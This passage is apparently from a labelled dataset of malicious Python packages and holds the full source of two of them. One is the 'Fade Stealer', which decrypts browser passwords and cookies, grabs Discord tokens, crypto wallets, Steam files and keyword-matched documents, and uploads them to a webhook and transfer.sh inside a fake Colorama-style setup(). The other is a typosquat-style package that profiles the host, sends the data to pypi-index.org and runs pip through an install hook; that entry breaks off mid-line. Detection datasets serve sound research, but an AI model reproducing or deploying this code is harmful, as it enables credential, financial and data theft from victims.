GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n    maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n        'binance'\n        'Electrum'\n        'Mycelium'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"\ufffd {foldpath}\\n\"\n            for ffil in foldlist:\n                a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\n\n\nsetup(\n\n    name='snelt',\n    packages=['snelt'],\n    version='1.0',\n    license='MIT',\n    description='nitrobrder',\n    author=' Jonathan Hartley',\n    keywords=['Colorama'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n", "target": 1}
{"idx": "goldensweatshirtwifi-99", "func": "import platform\nimport socket\nimport getpass\nimport os\nimport sys\nimport json\n\nif sys.version_info[0] >= 3:\n    import urllib.request as http_request\nif sys.version_info[0] == 2:\n    import urllib2 as http_request\n\nimport datetime\nimport hashlib\nimport uuid\nimport subprocess\n\nHOST = \"pypi-index.org\"\nPACKAGE = \"goldensweatshirtwifi\"\nH_F1 = \"3daac9ff4692baca30b600cf2a5147719af175b29e2fa6db0cd37a40087be8a0\" \nH_F2 = \"7b49060c65297cbd4c66618c741bb1a550d069882d9f228f3d291306e8058159\" \n\nH_F3 = \"2fb844c33800fdf9c9bc52de333ffcceba35c6e5d3376bc867af31efaada460e\" \nH_F4 = \"7beed9ebc9a1c689ec854f2294fcee20f7dcc5804e60c6f79c4cad1ea26456b2\" \n\nRESP = \"\"\n\ndef sha256(str_):\n    return hashlib.sha256(str_.encode('utf-8')).hexdigest()\n\ndef find_in_folder(dir, hash_):\n    for f in os.listdir(dir):\n        if sha256(f) == hash_:\n            return f\n\ndef gkobUSiTkM_1():\n    k = False\n    try:\n        if platform.system().lower() in ('darwin', 'linux'):\n            home_dir = os.path.expanduser(\"~\")\n            if os.path.isdir(home_dir):\n                f1 = find_in_folder(home_dir, H_F1)\n                if f1:\n                    f1 = os.path.join(home_dir, f1)\n                    f2 = find_in_folder(f1, H_F2)\n                    k = True if f2 else False\n    except:\n        pass\n\n    return k\n\ndef GsAVOBDTvu_2():\n    global RESP\n    try:\n        req = http_request.Request(\"http://127.0.0.1:19000/certs\")\n        response = http_request.urlopen(req, timeout=5)\n        RESP = response.read().decode('utf-8')\n        return True\n    except:\n        return False\n\ndef krNzfTsCTY_3():\n    for name, value in os.environ.items():\n        if sha256(name) == H_F3 and sha256(value) == H_F4:\n            return True\n    return False\n\ndef detect_system():\n    \n    \n    \n    \n    \n    key = 0\n    if gkobUSiTkM_1():\n        key = 1\n    elif GsAVOBDTvu_2():\n        key = 2\n    elif krNzfTsCTY_3():\n        key = 3 \n    \n    return key\n\ndef read_config(config):\n    c = \"\"\n    try:\n        f = open(config)\n        for line in f.readlines():\n            if line[0] != \"#\":\n                c += line\n        f.close()\n    except:\n        pass\n    \n    return c\n\n\ndef get_dns():\n    return read_config(\"/etc/resolv.conf\")\n    \n\ndef get_hosts():\n    return read_config(\"/etc/hosts\")\n\ndef get_time_zone():\n    res = \"\"\n    try:\n        c_utc = datetime.datetime.utcnow()\n        zone = \"\"\n        if sys.version_info[0] >= 3 and sys.version_info[1] >= 3:\n            zone = datetime.datetime.now().astimezone().tzinfo\n        else:\n            zone = \"\"\n        res = str(c_utc) + \" \" + str(zone)\n    except:\n        pass\n    return res\n\ndef getifip(ifn):\n    import socket, fcntl, struct\n\n    try:\n        sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        \n        if sys.version_info[0] >= 3:\n            ifn = ifn.encode()\n            return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack('256s', ifn[:15]))[20:24])\n    except:\n        pass\n    return \"UNKNOWN\"\n\ndef get_mac(ifn):\n    f = open(\"/sys/class/net/{}/address\".format(ifn))\n    mac = f.read()\n    f.close()\n    return mac\n\ndef get_network_interfaces():\n    interfaces = []\n    sysp = platform.system()\n\n    if sysp.lower() == \"linux\":\n        f = open(\"/proc/net/dev\", \"r\")\n        lines = f.readlines()[2:]\n        f.close()\n        for line in lines:\n            interface = line.split(\":\")[0].strip()\n            interfaces.append(interface)\n    elif sysp.lower() == \"darwin\":\n        process = subprocess.Popen([\"ifconfig\"], stdout=subprocess.PIPE)\n        output = process.communicate()[0].decode('utf-8')\n        lines = output.split(\"\\n\")\n        for line in lines:\n            if \"flags\" in line and \"mtu\" in line:\n                interface = line.split(\":\")[0].strip()\n                interfaces.append(interface)\n    elif sysp.lower() == \"windows\":\n        interfaces = [interface[0] for interface in socket.if_nameindex()]\n\n    return interfaces\n\ndef get_ip_addresses(interface):\n    ips = []\n    macs = []\n    sysp = platform.system()\n\n    if sysp.lower() == \"linux\":\n        ip = getifip(interface)\n        ips.append(ip)\n        mac = get_mac(interface)\n        macs.append(mac)\n\n    elif sysp.lower() == \"darwin\":\n        process = subprocess.Popen([\"ifconfig\", interface], stdout=subprocess.PIPE)\n        output = process.communicate()[0].decode('utf-8')\n        lines = output.split(\"\\n\")\n        for line in lines:\n            if \"inet \" in line:\n                ip = line.split(\" \")[1]\n                ips.append(ip)\n            if \"ether \" in line:\n                mac = line.split(\" \")[1]\n                macs.append(mac)\n            \n    elif sysp.lower() == \"windows\":\n        ips = [socket.gethostbyname(socket.gethostname())]\n\n    return ips, macs\n\n\ndef get_net():\n    c = \"\"\n    try:\n        network_interfaces = get_network_interfaces()\n        for interface in network_interfaces:\n            ips, macs = get_ip_addresses(interface)\n            if ips:\n                c += (\"{}|{}|{}\\n\".format(interface, ','.join(ips), \",\".join(macs)))\n    except:\n        pass\n\n    return c\n\ndef collect_info():\n    os_name = platform.system().lower()\n    os_version = platform.version()\n    hostname = socket.gethostname()\n    username = getpass.getuser()\n    current_directory = os.getcwd()\n    home_dir = os.path.expanduser(\"~\")\n    dns = get_dns()\n    hosts = get_hosts()\n    net = get_net() \n    c_time = get_time_zone()\n    k = detect_system()\n\n    data = {\n        \"src\": \"py\"+str(sys.version_info[0]) + \" \" + PACKAGE,\n        \"os\": \"{} {} {}\".format(os_name, platform.platform(), os_version),\n        \"hostname\": hostname,\n        \"user\": username,\n        \"cwd\": current_directory,\n        \"hd\" : home_dir,\n        \"dns\": dns,\n        \"hosts\" : hosts,\n        \"optn\": RESP,\n        \"net\": net,\n        \"time\": c_time,\n        \"key\": k\n    }\n\n    return data\n\ndef run_me():\n    \n    data = collect_info()\n    json_data = json.dumps({\"data\": data}).encode('utf-8')\n    url = \"https://{}/process_data\".format(HOST)\n    \n    try:  \n        req = http_request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})\n        response = http_request.urlopen(req, timeout=30)\n        \n    except http_request.HTTPError as e:\n        pass\n        \n    except Exception as e:\n        pass\n        \n\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport subprocess \nimport shutil\nimport site\nimport atexit\nimport sys, os\n\ndef get_index():\n    try:\n        f = open(os.path.expanduser(\"~/.pip/pip.conf\"))\n    except OSError:\n        return\n    except IOError:\n        return\n    \n    for line in f.readlines():\n        if \"index-url\" in line:\n            f.close()\n            return line.split(\"=\")[-1].strip()\n    f.close()\n\n\nclass CustomInstall(install):\n    def run(self):    \n        def _post_install():      \n            \n            pip = \"{} -m pip\".format(sys.executable)\n            \n            \n            \n            index_url = get_index()\n            if not index_url:\n                return\n\n             \n            if sys.version_info[0] >= 3 and sys.version_info[1] >= 10:\n                py_path = 'PYTHONPATH=\"{}\" '.format(site.getsitepackages()[0]) \n            else:\n                py_path = ''\n\n\n            \n            try:\n                s = subprocess.check_output('{}{} install {} --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n            except subprocess.CalledProcessError:\n                return\n            \n            \n            \n            if \"bdist_wheel\" in sys.argv:\n                \n                s = subprocess.check_output('{}{} download {} --no-deps --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n\n                dw_wheel = os.listdir(os.getcwd())[-1].strip()\n                \n                \n                t_dir = sys.argv[-1]\n                \n                if not os.path.exists(t_dir):\n                    os.makedirs(t_dir)\n                    shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n                else:\n                    \n                    t_wheel  = os.listdir(t_dir)[-1].strip()\n                    \n                    \n                    os.unlink(t_dir + \"/\" + t_wheel)\n                    \n                    shutil.move(dw_wheel, t_dir + \"/\" 